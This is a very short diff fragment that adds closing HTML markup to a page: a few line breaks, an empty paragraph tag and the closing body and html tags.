+<br><br><br><p>
+</body>
+</html>
